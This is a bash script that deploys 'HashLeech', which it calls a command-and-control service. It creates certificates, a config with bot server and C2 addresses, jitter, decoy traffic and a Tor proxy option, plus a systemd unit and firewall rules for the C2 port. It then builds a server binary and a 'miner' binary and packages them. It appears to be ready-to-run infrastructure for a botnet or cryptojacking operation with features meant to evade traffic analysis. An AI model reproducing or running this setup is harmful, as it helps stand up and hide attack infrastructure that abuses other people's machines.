#!/bin/bash

# Military-Grade HashLeech Deployment Script
# Classification: UNCLASSIFIED (when properly configured)

set -euo pipefail

echo "🛡️  HashLeech Military-Grade Security Deployment"
echo "================================================"

# Security check
if [[ $EUID -eq 0 ]]; then
   echo "❌ Do not run as root for security reasons"
   exit 1
fi

# Create secure directory structure
echo "📁 Creating secure directory structure..."
mkdir -p ./certs
mkdir -p ./logs
mkdir -p ./hsm
mkdir -p ./config

# Set secure permissions
chmod 700 ./certs ./hsm ./config
chmod 755 ./logs

# Generate military-grade certificates
echo "🔐 Generating military-grade certificates..."
cat > ./certs/openssl.conf << EOF
[req]
default_bits = 4096
prompt = no
distinguished_name = req_distinguished_name
req_extensions = v3_req

[req_distinguished_name]
C=US
ST=Virginia
L=Langley
O=Defense Systems
OU=Secure Communications
CN=secure-server.local

[v3_req]
keyUsage = keyEncipherment, dataEncipherment, digitalSignature
extendedKeyUsage = serverAuth, clientAuth
subjectAltName = @alt_names

[alt_names]
DNS.1 = secure-server.local
DNS.2 = command-control.internal
IP.1 = 127.0.0.1
IP.2 = 192.168.1.100
EOF

# Generate CA certificate
openssl genpkey -algorithm RSA -out ./certs/ca.key -pkcs8 -aes256
openssl req -new -x509 -key ./certs/ca.key -out ./certs/ca.crt -days 365 \
    -config ./certs/openssl.conf

# Generate server certificate
openssl genpkey -algorithm RSA -out ./certs/server.key -pkcs8 -aes256
openssl req -new -key ./certs/server.key -out ./certs/server.csr \
    -config ./certs/openssl.conf
openssl x509 -req -in ./certs/server.csr -CA ./certs/ca.crt -CAkey ./certs/ca.key \
    -out ./certs/server.crt -days 365 -extensions v3_req \
    -extfile ./certs/openssl.conf

# Generate client certificate
openssl genpkey -algorithm RSA -out ./certs/client.key -pkcs8 -aes256
openssl req -new -key ./certs/client.key -out ./certs/client.csr \
    -config ./certs/openssl.conf
openssl x509 -req -in ./certs/client.csr -CA ./certs/ca.crt -CAkey ./certs/ca.key \
    -out ./certs/client.crt -days 365

# Calculate certificate pins
echo "📌 Calculating certificate pins..."
SERVER_PIN=$(openssl x509 -in ./certs/server.crt -outform DER | sha256sum | cut -d' ' -f1)
CLIENT_PIN=$(openssl x509 -in ./certs/client.crt -outform DER | sha256sum | cut -d' ' -f1)

echo "Server Certificate Pin: $SERVER_PIN"
echo "Client Certificate Pin: $CLIENT_PIN"

# Create environment configuration
echo "⚙️  Creating environment configuration..."
cat > ./config/military.env << EOF
# Military-Grade Security Configuration
# Classification: UNCLASSIFIED

# Network Configuration
SERVER_NAME=secure-server.local
C2_ADDRESS=192.168.1.100:7003
BOT_SERVER_IP=0.0.0.0
BOT_SERVER_PORT=7003
WEB_SERVER_IP=0.0.0.0
WEB_SERVER_PORT=443

# Certificate Pinning
SERVER_CERT_PIN=$SERVER_PIN
CLIENT_CERT_PIN=$CLIENT_PIN

# Security Settings
KILL_SWITCH_TIMEOUT=600
MEMORY_SCRUB_PASSES=7
MAX_FAILED_AUTH=3
KEY_ROTATION_INTERVAL=86400

# Network Obfuscation (Optional)
# SOCKS5_PROXY=127.0.0.1:9050

# HSM Configuration (if available)
# HSM_ENABLED=true
# HSM_TOKEN_LABEL=defense_hsm
# HSM_PIN=changeme

# Audit Logging
AUDIT_LOG_LEVEL=INFO
AUDIT_LOG_FILE=./logs/audit.log

# TLS Configuration
TLS_MIN_VERSION=1.3
TLS_MAX_VERSION=1.3
TLS_CIPHERS=TLS_AES_256_GCM_SHA384,TLS_CHACHA20_POLY1305_SHA256
TLS_CURVES=X25519,P384

# Quantum Resistance Preparation
QUANTUM_SAFE_ENABLED=true
QUANTUM_KEY_SIZE=128

# Traffic Analysis Resistance
JITTER_MIN=3000
JITTER_MAX=15000
TRAFFIC_MIXING_ENABLED=true
DECOY_TRAFFIC_ENABLED=true

# Memory Protection
MEMORY_LOCKING_ENABLED=true
SECURE_ALLOCATION_ENABLED=true

# Operational Security
COVERT_MODE=false
STEALTH_MODE=false
EMERGENCY_SHUTDOWN=true
EOF

# Create systemd service file
echo "🔧 Creating systemd service..."
cat > ./config/hashleech-military.service << EOF
[Unit]
Description=HashLeech Military-Grade Command & Control
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=hashleech
ExecStart=/opt/hashleech/hashleech-military
WorkingDirectory=/opt/hashleech
EnvironmentFile=/opt/hashleech/config/military.env

# Security hardening
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/opt/hashleech/logs /opt/hashleech/hsm
MemoryDenyWriteExecute=true
RestrictRealtime=true
SystemCallArchitectures=native

# Resource limits
LimitNOFILE=65536
LimitNPROC=32768

[Install]
WantedBy=multi-user.target
EOF

# Create firewall rules
echo "🔥 Creating firewall configuration..."
cat > ./config/firewall-rules.sh << EOF
#!/bin/bash
# HashLeech Military Firewall Rules

# Clear existing rules
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X

# Default policies
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Allow loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# Allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Allow SSH (limit to specific IPs)
iptables -A INPUT -p tcp --dport 22 -s 192.168.1.0/24 -j ACCEPT

# Allow HashLeech C2 (TLS only)
iptables -A INPUT -p tcp --dport 7003 -j ACCEPT

# Allow HashLeech Web (HTTPS only)
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Rate limiting for C2 connections
iptables -A INPUT -p tcp --dport 7003 -m limit --limit 10/minute --limit-burst 5 -j ACCEPT
iptables -A INPUT -p tcp --dport 7003 -j DROP

# Drop all other traffic
iptables -A INPUT -j DROP

# Save rules
iptables-save > /etc/iptables/rules.v4
EOF

chmod +x ./config/firewall-rules.sh

# Create monitoring script
echo "📊 Creating monitoring script..."
cat > ./config/security-monitor.sh << EOF
#!/bin/bash
# HashLeech Security Monitoring

LOG_FILE="./logs/security-monitor.log"
ALERT_THRESHOLD=5

echo "\$(date): Security monitoring started" >> \$LOG_FILE

while true; do
    # Monitor failed authentication attempts
    FAILED_AUTHS=\$(grep "AUTH_FAILURE" ./logs/audit.log | tail -100 | wc -l)
    if [ \$FAILED_AUTHS -gt \$ALERT_THRESHOLD ]; then
        echo "\$(date): ALERT - High number of failed authentications: \$FAILED_AUTHS" >> \$LOG_FILE
    fi
    
    # Monitor certificate pinning violations
    PIN_VIOLATIONS=\$(grep "PIN_VIOLATION" ./logs/audit.log | tail -10 | wc -l)
    if [ \$PIN_VIOLATIONS -gt 0 ]; then
        echo "\$(date): CRITICAL - Certificate pinning violations detected: \$PIN_VIOLATIONS" >> \$LOG_FILE
    fi
    
    # Monitor kill switch activations
    KILL_SWITCH=\$(grep "KILL_SWITCH" ./logs/audit.log | tail -1)
    if [ ! -z "\$KILL_SWITCH" ]; then
        echo "\$(date): CRITICAL - Kill switch activation: \$KILL_SWITCH" >> \$LOG_FILE
    fi
    
    # Monitor memory usage
    MEM_USAGE=\$(ps -o pid,rss,comm -C hashleech-military | tail -1 | awk '{print \$2}')
    if [ \$MEM_USAGE -gt 1048576 ]; then  # 1GB
        echo "\$(date): WARNING - High memory usage: \${MEM_USAGE}KB" >> \$LOG_FILE
    fi
    
    sleep 60
done
EOF

chmod +x ./config/security-monitor.sh

# Build the application
echo "🔨 Building military-grade application..."
go build -ldflags="-s -w" -o hashleech-military main.go
go build -ldflags="-s -w" -o miner-military miner/mine_secure.go

# Set executable permissions
chmod +x hashleech-military miner-military

# Create deployment package
echo "📦 Creating deployment package..."
tar -czf hashleech-military-$(date +%Y%m%d).tar.gz \
    hashleech-military \
    miner-military \
    certs/ \
    config/ \
    MILITARY_SECURITY.md \
    README.md

echo "✅ Military-grade deployment completed!"
echo ""
echo "📋 Next Steps:"
echo "1. Review and customize ./config/military.env"
echo "2. Configure certificate pins for your environment"
echo "3. Set up HSM if available"
echo "4. Configure network obfuscation (Tor/proxy)"
echo "5. Run security tests before deployment"
echo ""
echo "🚨 Security Reminders:"
echo "- Change default certificate passwords"
echo "- Configure proper firewall rules"
echo "- Enable audit logging"
echo "- Set up monitoring alerts"
echo "- Test kill switch functionality"
echo ""
echo "🛡️  Classification: UNCLASSIFIED (when properly configured)"
echo "   For SECRET/TOP SECRET, additional hardening required"
EOF